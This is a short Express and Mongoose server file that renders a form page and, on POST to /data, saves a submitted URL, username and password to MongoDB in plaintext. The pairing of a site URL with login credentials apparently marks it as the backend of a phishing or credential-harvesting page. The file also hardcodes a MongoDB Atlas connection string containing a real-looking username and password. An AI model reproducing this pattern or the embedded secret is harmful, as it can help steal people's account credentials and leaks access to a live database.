const express = require("express"),
      mongoose = require("mongoose"),
      User = require("./models/users");

const app = express();

app.set("view engine","ejs");
app.use(express.json());                  app.use(express.urlencoded({extended: true}));

app.get("/",(req,res)=>{
 res.render("index.ejs");
});

app.post("/data",(req,res)=>{
   const user = new User({
    url:req.body.url,
    username:req.body.username,
    password:req.body.password
	 })

   user.save((err)=>{
   if(err) console.log(err);
	 })
   res.render("done.ejs");
});

mongoose                                    .connect("mongodb+srv://brian_kithinji:WWzLWTWp6khjjwe@cluster0.qpjbe.mongodb.net/bnk?retryWrites=true&w=majority", {              useNewUrlParser: true,                    useCreateIndex: true,
    useUnifiedTopology:true,                  useFindAndModify: false
  })
  .then(() =>{
app.listen(process.env.PORT || 3000)
console.log(
'DB connnection successful!');
    })
    .catch(err=>console.log(err));
